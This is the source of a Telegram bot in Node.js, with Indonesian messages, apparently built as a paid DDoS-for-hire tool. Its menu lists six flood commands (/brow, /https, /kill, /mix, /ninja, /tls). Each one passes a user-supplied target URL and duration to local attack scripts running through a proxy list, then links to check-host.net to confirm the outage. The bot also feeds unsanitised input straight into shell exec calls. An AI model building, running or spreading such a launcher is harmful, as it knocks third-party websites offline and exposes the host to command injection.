const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const { exec, spawn, execSync } = require("child_process");
const axios = require('axios');
const settings = require('./settings')
const botToken = settings.token;
const owner = settings.adminId;
const domain = settings.domain;
const plta = settings.plta;
const pltc = settings.pltc;

const bot = new TelegramBot(botToken, { polling: true });
const sendMessage = (chatId, text) => bot.sendMessage(chatId, text);
bot.sendMessage(owner,`Bot Online\nOwnerId : ${owner}\nBotId : ${botToken}`);

function getRuntime(startTime) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    return `${hours} Jam ${minutes} Menit ${seconds} Detik`;
}
const nama = 'law';
const author = 'dqr';
// Informasi waktu mulai bot
const startTime = Date.now();
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const startTime = Date.now();
    bot.sendMessage(chatId, `
┏❐ \`\`\`PermenMisc Telegram\`\`\` ❐

\`\`\`- Uptime: ${getRuntime(startTime)}\`\`\`
\`\`\`- Bot Name: ${settings.botName}\`\`\`
\`\`\`- Version: 1.9\`\`\`
┗❐
▬▭▬▭▬▭▬▭▬▭▬▭▬
\`DDos Menu\`
\`\`\`- /brow\`\`\`
\`\`\`- /https\`\`\`
\`\`\`- /kill\`\`\`
\`\`\`- /mix\`\`\`
\`\`\`- /ninja\`\`\`
\`\`\`- /tls\`\`\`
▬▭▬▭▬▭▬▭▬▭▬▭▬
`, {
reply_markup: {
        inline_keyboard: [
          [
            { text: 'SALURAN WA', url: 'https://whatsapp.com/channel/00294OmIm8JJno0z' }, { text: 'SUBSCRIBE', url: 'https://youtube.com/@bagazzmodz17' }
          ]
        ]
      }
     }) 
});
bot.onText(/\/menu/, (msg) => {
    const chatId = msg.chat.id;
    const startTime = Date.now();
    bot.sendMessage(chatId, `
┏❐ \`\`\`ddos Telegram\`\`\` ❐

\`\`\`- Uptime: ${getRuntime(startTime)}\`\`\`
\`\`\`- Bot Name: ${settings.botName}\`\`\`
\`\`\`- Version: 1.9\`\`\`
┗❐
▬▭▬▭▬▭▬▭▬▭▬▭▬
\`DDos Menu\`
\`\`\`- /brow\`\`\`
\`\`\`- /https\`\`\`
\`\`\`- /kill\`\`\`
\`\`\`- /mix\`\`\`
\`\`\`- /ninja\`\`\`
\`\`\`- /tls\`\`\`
▬▭▬▭▬▭▬▭▬▭▬▭▬
`, {
reply_markup: {
        inline_keyboard: [
          [
            { text: 'SALURAN WA', url: 'https://whatsapp.com/channel/0ZiC84OmIm8JJno0z' }, { text: 'SUBSCRIBE', url: 'https://youtube.com/@bagazzmodz17' }
          ]
        ]
      }
     }) 
});

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// DDos
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// brow
bot.onText(/^(\.|\#|\/)brow$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /brow url duration\nscript by YT : BagazzModz`);
  });
bot.onText(/\/brow (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = owner.includes(String(msg.from.id));
  if (!isOwner) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/dqr' }
          ]
        ]
      }
    });
    return;
  }
  const text = match[1];
  const t = text.split(' ');
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /brow url duration');
  }
  let target = t[0];
  let duration = t[1];
  await exec(`node ./lib/brow.js ${target} ${duration} 32 1 proxy.txt`)
  bot.sendMessage(chatId, `Sedang mengirim DDos\nDuration: ${duration}\nTarget: ${target}\nSilahkan cek dengan klik link ini
https://check-host.net/check-http?host=${target}`)
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// https
bot.onText(/^(\.|\#|\/)https$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /https url duration\nscript by YT : BagazzModz`);
  });
bot.onText(/\/https (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = owner.includes(String(msg.from.id));
  if (!isOwner) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/dqr' }
          ]
        ]
      }
    });
    return;
  }
  const text = match[1];
  const t = text.split(' ');
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /https url duration');
  }
  let target = t[0];
  let duration = t[1];
  await exec(`node ./lib/https.js ${target} ${duration} 1 32 proxy.txt`)
  bot.sendMessage(chatId, `Sedang mengirim DDos\nDuration: ${duration}\nTarget: ${target}\nSilahkan cek dengan klik link ini
https://check-host.net/check-http?host=${target}`)
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// kill
bot.onText(/^(\.|\#|\/)kill$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /kill url duration\nscript by YT : BagazzModz`);
  });
bot.onText(/\/kill (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = owner.includes(String(msg.from.id));
  if (!isOwner) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/dqr' }
          ]
        ]
      }
    });
    return;
  }
  const text = match[1];
  const t = text.split(' ');
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /kill url duration');
  }
  let target = t[0];
  let duration = t[1];
  await exec(`node ./lib/kill.js ${target} ${duration} 32 1`)
  bot.sendMessage(chatId, `Sedang mengirim DDos\nDuration: ${duration}\nTarget: ${target}\nSilahkan cek dengan klik link ini
https://check-host.net/check-http?host=${target}`)
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// mix
bot.onText(/^(\.|\#|\/)mix$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /mix url duration\nscript by YT : BagazzModz`);
  });
bot.onText(/\/mix (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = owner.includes(String(msg.from.id));
  if (!isOwner) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/dqr' }
          ]
        ]
      }
    });
    return;
  }
  const text = match[1];
  const t = text.split(' ');
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /mix url duration');
  }
  let target = t[0];
  let duration = t[1];
  await exec(`node ./lib/mix.js ${target} ${duration} 32 1`)
  bot.sendMessage(chatId, `Sedang mengirim DDos\nDuration: ${duration}\nTarget: ${target}\nSilahkan cek dengan klik link ini
https://check-host.net/check-http?host=${target}`)
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// ninja
bot.onText(/^(\.|\#|\/)ninja$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /ninja url duration\nscript by YT : BagazzModz`);
  });
bot.onText(/\/ninja (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = owner.includes(String(msg.from.id));
  if (!isOwner) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/dqr' }
          ]
        ]
      }
    });
    return;
  }
  const text = match[1];
  const t = text.split(' ');
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /ninja url duration');
  }
  let target = t[0];
  let duration = t[1];
  await exec(`node ./lib/ninja.js ${target} ${duration}`)
  bot.sendMessage(chatId, `Sedang mengirim ddos\nDuration: ${duration}\nTarget: ${target}\nSilahkan cek dengan klik link ini
https://check-host.net/check-http?host=${target}`)
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
//tls
bot.onText(/^(\.|\#|\/)tls$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /tls url duration\nscript by YT : BagazzModz`);
  });
bot.onText(/\/tls (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = owner.includes(String(msg.from.id));
  if (!isOwner) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/dqr' }
          ]
        ]
      }
    });
    return;
  }
  const text = match[1];
  const t = text.split(' ');
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /tls url duration');
  }
  let target = t[0];
  let duration = t[1];
  await exec(`node ./lib/tls.js ${target} ${duration} 32 1 proxy.txt`)
  bot.sendMessage(chatId, `Sedang mengirim DDos\nDuration: ${duration}\nTarget: ${target}\nSilahkan cek dengan klik link ini
https://check-host.net/check-http?host=${target}`)
});

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
